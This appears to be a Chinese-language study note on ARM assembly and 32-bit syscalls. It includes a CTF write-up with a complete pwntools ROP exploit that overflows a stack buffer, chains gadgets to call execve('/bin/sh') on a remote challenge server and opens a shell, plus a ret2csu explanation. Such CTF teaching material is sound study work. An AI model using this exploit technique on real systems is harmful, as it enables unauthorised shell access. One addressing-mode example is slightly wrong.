---
title: ARM
date: '2024-12-09 21:12:08'
updated: '2025-04-07 21:39:55'
---
# 0x00 ARM 指令
汇编运算过程都是从有右向左运算，例如：

`SUB R0, R1, R2`指令，是将 R1 与 R2 相减后将结果置于 R0 寄存器：R0=R1-R2

最左边的寄存器用来放指令结果

| **<font style="color:rgb(51, 51, 51);">指令</font>** | **<font style="color:rgb(51, 51, 51);">功能</font>** | **<font style="color:rgb(51, 51, 51);">指令</font>** | **<font style="color:rgb(51, 51, 51);">功能</font>** |
| --- | --- | --- | --- |
| <font style="color:rgb(51, 51, 51);">MOV</font> | <font style="color:rgb(51, 51, 51);">移动数据</font> | <font style="color:rgb(51, 51, 51);">EOR</font> | <font style="color:rgb(51, 51, 51);">按位异或</font> |
| <font style="color:rgb(51, 51, 51);">MVN</font> | <font style="color:rgb(51, 51, 51);">移动数据并取反</font> | <font style="color:rgb(51, 51, 51);">LDR</font> | <font style="color:rgb(51, 51, 51);">加载</font> |
| <font style="color:rgb(51, 51, 51);">ADD</font> | <font style="color:rgb(51, 51, 51);">加法</font> | <font style="color:rgb(51, 51, 51);">STR</font> | <font style="color:rgb(51, 51, 51);">存储</font> |
| <font style="color:rgb(51, 51, 51);">SUB</font> | <font style="color:rgb(51, 51, 51);">减法</font> | <font style="color:rgb(51, 51, 51);">LDM</font> | <font style="color:rgb(51, 51, 51);">加载多个</font> |
| <font style="color:rgb(51, 51, 51);">MUL</font> | <font style="color:rgb(51, 51, 51);">乘法</font> | <font style="color:rgb(51, 51, 51);">STM</font> | <font style="color:rgb(51, 51, 51);">存储多个</font> |
| <font style="color:rgb(51, 51, 51);">LSL</font> | <font style="color:rgb(51, 51, 51);">逻辑左移</font> | <font style="color:rgb(51, 51, 51);">PUSH</font> | <font style="color:rgb(51, 51, 51);">入栈</font> |
| <font style="color:rgb(51, 51, 51);">LSR</font> | <font style="color:rgb(51, 51, 51);">逻辑右移</font> | <font style="color:rgb(51, 51, 51);">POP</font> | <font style="color:rgb(51, 51, 51);">出栈</font> |
| <font style="color:rgb(51, 51, 51);">ASR</font> | <font style="color:rgb(51, 51, 51);">算术右移</font> | <font style="color:rgb(51, 51, 51);">B</font> | <font style="color:rgb(51, 51, 51);">跳转</font> |
| <font style="color:rgb(51, 51, 51);">ROR</font> | <font style="color:rgb(51, 51, 51);">右旋</font> | <font style="color:rgb(51, 51, 51);">BL</font> | <font style="color:rgb(51, 51, 51);">Link+跳转</font> |
| <font style="color:rgb(51, 51, 51);">CMP</font> | <font style="color:rgb(51, 51, 51);">比较</font> | <font style="color:rgb(51, 51, 51);">BX</font> | <font style="color:rgb(51, 51, 51);">分支跳转</font> |
| <font style="color:rgb(51, 51, 51);">AND</font> | <font style="color:rgb(51, 51, 51);">按位与</font> | <font style="color:rgb(51, 51, 51);">BLX</font> | <font style="color:rgb(51, 51, 51);">Linx+分支跳转</font> |
| <font style="color:rgb(51, 51, 51);">ORR</font> | <font style="color:rgb(51, 51, 51);">按位或</font> | <font style="color:rgb(51, 51, 51);">SWI/SVC</font> | <font style="color:rgb(51, 51, 51);">系统调用</font> |


`B`、`BL`、`BX`、`BLX`指令：跳转至指定寄存器指向的内存位置继续执行

`LDR`指令：用来将寄存器指向的内存中的值存进寄存器

`STR`指令：用来将寄存器中的值存进寄存器指向的内存当中

## 符号
1. `**<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">#</font>**`（立即数，可以理解成数字常量）：
    - 这是最常见的符号，用于表示一个立即数常量。立即数可以直接嵌入到指令中。例如：

```plain
MOV R0, #5  ; 将立即数 5 移动到 R0 寄存器
```

2. `**<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">[]</font>**`（寄存器间接寻址）：
    - 用于表示内存访问时的寄存器间接寻址方式。当寄存器内存储的是地址时，可以通过方括号 `<font style="color:rgb(36, 41, 47);">[]</font>` 访问该地址。例如：

```plain
LDR R0, [R1]  ; 从 R1 寄存器指向的地址加载数据到 R0
```

3. `**<font style="color:rgb(36, 41, 47);">!</font>**`（更新地址）：
    - 在进行寄存器间接寻址时，可以使用 `<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">!</font>` 来表示在操作完成后更新地址寄存器的值。例如：

```plain
LDR R0, [R1], #4  ; 将 R1 指向的值加载到 R0 并更新 R1，R1 增加 4
```

4. `**<font style="color:rgb(36, 41, 47);">-</font>**`（偏移量）：
    - 在内存寻址模式中<font style="background-color:rgba(255, 255, 255, 0);">，</font>`<font style="color:rgb(36, 41, 47);background-color:rgba(255, 255, 255, 0);">-</font>` 符号用来表示偏移量，表示从某个地址减去一个值。例如：

```plain
LDR R0, [R1, #-4]  ; 从 R1 减去 4 的地址加载数据到 R0
```

5. `**<font style="color:rgb(36, 41, 47);">:</font>**`（范围指定）：
    - 用于表示字面量值范围，通常在定义常量或者偏移时使用。比如在一些定义和操作中，可以看到类似 `<font style="color:rgb(36, 41, 47);">PC-relative</font>` 的寻址方式，常常涉及到冒号符号。

# 0x01 系统调用
ARM系统调用需要将系统调用的编号放在 `R7` 寄存器中，其他参数则依次放在 `R0` 到 `R6` 寄存器中。  
(分别对应x86架构64位传参的`rdi`、`rsi`、`rdx`等寄存器)

通过查询32位系统调用号可以知道，`execve`的系统调用号是11(0xb)，而要触发系统调用则要利用指令`svc #0`。(相当于`syscall`)

arm指令当中是没有`leave`和`ret`指令的，  
寄存器`LR`（链接寄存器）负责存放调用函数的语句的下一句，也就是被调用函数的返回地址，  
寄存器`PC`（程序计数器）负责保存程序下一步进行的指令的地址。

## 题目
### XSCTF热身赛 ARM?手臂?
先是`checksec`查了一下安全措施：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241028164955067.png)![](/images/db7ab421a2061f83617ecf315c3dd1d3.png)

发现好像开了`canary`  
进到IDA里面看看伪代码和`arm32`汇编：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241028165056645.png)![](/images/f3b150ddc33d53b7358b6ff32c648b2b.png)

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241028165155837.png)![](/images/a9ed8f8652d59273a2d4771b1a2c4815.png)

发现实际上没有`canary`，而`read`函数给了个256个字节的读取，`v1`只有68个字节的空间，可以进行栈溢出。

接下来看看二进制文件里面有没有给什么能用的东西：  
发现`string`里面有`/bin/sh`字符串可以利用，但是没有函数调用的`system`函数或者`execve`函数，考虑系统调用。

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241028231852394.png)![](/images/16a9640825db6004a64e31184f72a33b.png)

到这里可以知道我们的目标了：

> R0 : `/bin/sh`地址  
R1 : 0  
R2 : 0  
R7 : 11（0xb）  
调用`svc #0`汇编指令
>

接着来找gadget：  
先找`svc #0`指令：  
挑个`svc #0`开头的应该就可以了，程序执行到这一步就已经getshell

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241028231523765.png)![](/images/b6a7216d790dbb8fbb11b866a1b90352.png)

再找`pop`指令：

![](C:\Users\garhi\AppData\Roaming\Typora\typora-user-images\image-20241028221413377.png)![](/images/8bf027418bc87b0c10f116ae798d5564.png)

可以用的有：

> 0x0005f73c : pop {r0, pc}  
0x0005f824 : pop {r1, pc}  
0x00027d78 : pop {r7, pc}
>

接着看`b`指令(BL、BLX、BX...)：尽量找短的gadget  
我选择：`0x00043224 : mov r2, r4 ; blx r3`  
前面找`pop`指令的时候发现没法直接通过`pop`指令控制`r2`寄存器，可以用这句顺带把`r2`寄存器的值设为0

再回过头看`pop`指令有哪些能用上的:

> 0x00010160 : pop {r3, pc}  
0x000280a4 : pop {r4, r7, pc} #前面的 pop {r7, pc}换成这个
>

这下凑齐gadget了：

> gadget1=0x5f73c #pop r0,pc  
gadget2=0x5f824 #pop r1,pc  
gadget3=0x280a4 #pop r4,r7,pc  
gadget4=0x10160 #pop r3,pc  
gadget5=0x43224 #mov r2,r4 ; blx r3
>

献上exp：

```python
from pwn import *
context(os = "linux", arch = 'arm', log_level = 'debug')

link=remote("43.248.97.213",40088)

binsh=0x8A090
gadget1=0x5f73c #pop r0,pc
gadget2=0x5f824 #pop r1,pc
gadget3=0x280a4 #pop r4,r7,pc
gadget4=0x10160 #pop r3,pc
gadget5=0x43224 #mov r2,r4 ; blx r3
svc=0x5829c #arm32 系统调用

padding=0x44
payload=b'a'*padding
payload+=p32(gadget1)
payload+=p32(binsh) 
payload+=p32(gadget2) 
payload+=p32(0) 
payload+=p32(gadget3) 
payload+=p32(0) 
payload+=p32(0xb) 
payload+=p32(gadget4)
payload+=p32(svc)
payload+=p32(gadget5)
link.recvuntil(b"world\n")
link.sendline(payload)
link.interactive()
```

# 0x02 ret2csu
arm 架构下`_libc_csu_init_`函数的汇编的一部分：

![](/images/04a374d97fa82243e6dda21718e2d7db.png)

ret2csu目的是利用`_libc_csu_init_`函数来控制寄存器的值和调用函数

关键在于`BLX R3`这个语句，

`R3`没法直接通过 `POP`指令直接控制，

所以通过上面的`LDR R3, [R5, #4]!`将`R5`寄存器加 4 的值赋给 `R3`，

而`POP`语句当中包括`R5`，可以直接控制它的值。

## 过程
栈溢出到最后的`POP`语句把一系列的寄存器的值修改，

再利用`POP PC`跳转到最上面的`MOV`语句继续执行

，注意`PC`对应行 x64 架构中的`RIP`

`R4`=0，如果不需要执行后面的`BLX loc_10D7C`跳转到最前面的`MOV`语句就可以随便赋值

`R5`=要调用的函数的地址减去 4

`R6`=函数第一个参数

`R7`=函数第二个参数

`R8`=函数第三个参数

`R9`=1，如果不需要执行后面的`BLX loc_10D7C`跳转到最前面的`MOV`语句就可以随便赋值

`R10`随便赋值

`PC`=最前面的语句`MOV R2, R8`的地址



